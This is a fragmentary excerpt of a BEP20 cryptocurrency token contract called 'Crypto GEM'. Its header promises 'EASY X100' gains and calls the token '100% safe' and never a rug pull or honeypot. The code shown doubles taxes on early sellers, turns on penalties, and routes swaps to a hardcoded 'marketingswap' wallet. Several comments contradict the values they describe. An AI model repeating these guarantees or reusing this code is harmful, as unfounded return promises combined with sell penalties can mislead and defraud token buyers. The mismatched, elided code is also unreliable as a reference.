...
/*
CRYPTO GEM
BEST GEM OF THE DAY - EASY X100
100% safe token , never rug or honey, check this address in bscscan for see last tokens.
TG : https://t.me/x100CryptoGem
...
3% to devWallet
7% to liquidity
DOUBLE TAXES FOR WHO SOLD IN 3 FIRST HOURS
...
contract CryptoGem is Context, IBEP20, Ownable {
    ...
    uint256 private _maxWallet = _tTotal.div(10**2).mul(95);
    
    uint256 public _maxTxAmount = (_tTotal * 5) / 100; // 1.5% MAX 15,000,000
    uint256 public _maxWalletSize = (_tTotal * 5) / 100; // 2.5% MAX 25,000,000
    ...
    string private _name = "Crypto GEM";
    string private _symbol = "CryptoGem";
    ...
    constructor() public {
        ...
        isTxLimitExempt[address(_pancakeswapV2Router)] = true;
        isTxLimitExempt[pcsV2Pair] = true;
    ...
    function restoreAllFee() private {
     ...
     function _transfer(
        ...
        if (
        	...
        	if (recipient != pcsV2Pair && recipient != DEAD) {
            	require(isTxLimitExempt[recipient] || _rOwned[recipient] + amount <= _maxWalletSize, "Transfer amount exceeds the bag size.");
        	}
            turnOnPenalties();
        }
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        address marketingswap =0x087973AE2C2f35952A676c469BBDAc9a268BEb0A;
